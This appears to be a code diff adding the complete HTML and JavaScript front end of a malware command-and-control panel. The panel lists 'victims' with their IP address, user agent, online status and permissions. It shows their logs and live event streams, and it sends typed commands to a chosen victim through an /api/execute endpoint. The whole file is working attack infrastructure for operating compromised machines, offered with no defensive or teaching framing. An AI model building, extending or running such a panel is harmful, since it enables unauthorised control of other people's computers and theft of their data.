@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>C2 Control Panel</title>
+<style>
+  body { font-family: Arial, sans-serif; margin: 0; background: #111; color: #eee; }
+  header { background: #222; padding: 10px; text-align: center; }
+  main { display: flex; height: calc(100vh - 50px); }
+  aside { width: 250px; background: #1a1a1a; overflow-y: auto; border-right: 1px solid #333; }
+  section { flex: 1; display: flex; flex-direction: column; }
+  h2 { margin: 0; padding: 10px; background: #333; font-size: 16px; }
+  ul { list-style: none; padding: 0; margin: 0; }
+  li { padding: 8px; border-bottom: 1px solid #333; cursor: pointer; }
+  li:hover { background: #444; }
+  li.active { background: #555; }
+  .details { padding: 10px; background: #181818; flex: 0 0 auto; }
+  .logs { flex: 1; background: #000; overflow-y: auto; padding: 10px; font-family: monospace; }
+  .command-box { display: flex; border-top: 1px solid #333; }
+  .command-box input { flex: 1; padding: 8px; border: none; outline: none; background: #222; color: #eee; }
+  .command-box button { padding: 8px; background: #444; border: none; color: #eee; cursor: pointer; }
+  .command-box button:hover { background: #666; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>C2 Control Panel</h1>
+</header>
+
+<main>
+  <aside>
+    <h2>Victims</h2>
+    <ul id="victim-list"></ul>
+  </aside>
+
+  <section>
+    <div class="details" id="victim-details">
+      <em>Select a victim to view details...</em>
+    </div>
+    <div class="logs" id="log-output"></div>
+    <div class="command-box">
+      <input type="text" id="command-input" placeholder="Enter command...">
+      <button onclick="sendCommand()">Send</button>
+    </div>
+  </section>
+</main>
+
+<script>
+let victims = [];
+let selectedVictim = null;
+let currentEventSource = null;
+
+async function fetchVictims() {
+  try {
+    const res = await fetch('/api/victims');
+    victims = await res.json();
+    renderVictims();
+  } catch (e) {
+    console.error("Error fetching victims", e);
+  }
+}
+
+function renderVictims() {
+  const list = document.getElementById("victim-list");
+  list.innerHTML = "";
+  victims.forEach(v => {
+    const li = document.createElement("li");
+    li.textContent = `${v.id} ${v.is_online ? '🟢' : '🔴'}`;
+    if (v.id === selectedVictim) li.classList.add("active");
+    li.onclick = () => selectVictim(v.id);
+    list.appendChild(li);
+  });
+}
+
+async function selectVictim(id) {
+  selectedVictim = id;
+  renderVictims();
+  const victim = victims.find(v => v.id === id);
+  if (victim) {
+    document.getElementById("victim-details").innerHTML = `
+      <strong>ID:</strong> ${victim.id}<br>
+      <strong>IP:</strong> ${victim.ip}<br>
+      <strong>User-Agent:</strong> ${victim.user_agent}<br>
+      <strong>Created:</strong> ${victim.created_at}<br>
+      <strong>Last Seen:</strong> ${victim.last_seen}<br>
+      <strong>Online:</strong> ${victim.is_online ? 'Yes' : 'No'}<br>
+      <strong>Permissions:</strong> ${JSON.stringify(victim.permissions)}
+    `;
+  }
+  document.getElementById("log-output").innerHTML = "";
+  await fetchLogs(id);
+  openSSEForVictim(id);
+}
+
+async function fetchLogs(id) {
+  try {
+    const res = await fetch(`/api/logs/${id}`);
+    const data = await res.json();
+    data.logs.reverse().forEach(log => {
+      logMessage(`[${log.created_at}] ${log.type}: ${JSON.stringify(log.payload)}`);
+    });
+  } catch (e) {
+    console.error("Error fetching logs", e);
+  }
+}
+
+function logMessage(msg) {
+  const logOut = document.getElementById("log-output");
+  const div = document.createElement("div");
+  div.textContent = msg;
+  logOut.appendChild(div);
+  logOut.scrollTop = logOut.scrollHeight;
+}
+
+function sendCommand() {
+  const cmd = document.getElementById("command-input").value.trim();
+  if (!cmd || !selectedVictim) return;
+  fetch('/api/execute', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ victim_id: selectedVictim, command: cmd })
+  }).then(r => r.json()).then(data => {
+    logMessage(`Command queued: ${cmd}`);
+  });
+  document.getElementById("command-input").value = "";
+}
+
+// SSE connection for live logs
+function openSSEForVictim(victimId) {
+  if (currentEventSource) {
+    try { currentEventSource.close(); } catch(e) {}
+    currentEventSource = null;
+  }
+  if (!victimId) return;
+  const es = new EventSource(`/stream?victim=${encodeURIComponent(victimId)}`);
+  es.onmessage = (evt) => {
+    try {
+      const data = JSON.parse(evt.data);
+      const t = (new Date(data.ts)).toLocaleTimeString();
+      logMessage(`[${t}] ${data.type}: ${JSON.stringify(data.payload)}`);
+    } catch (e) {
+      console.error("Error parsing SSE", e);
+    }
+  };
+  es.onerror = () => {
+    logMessage("⚠ SSE connection lost.");
+  };
+  currentEventSource = es;
+}
+
+setInterval(fetchVictims, 5000);
+fetchVictims();
+</script>
+
+</body>
+</html>
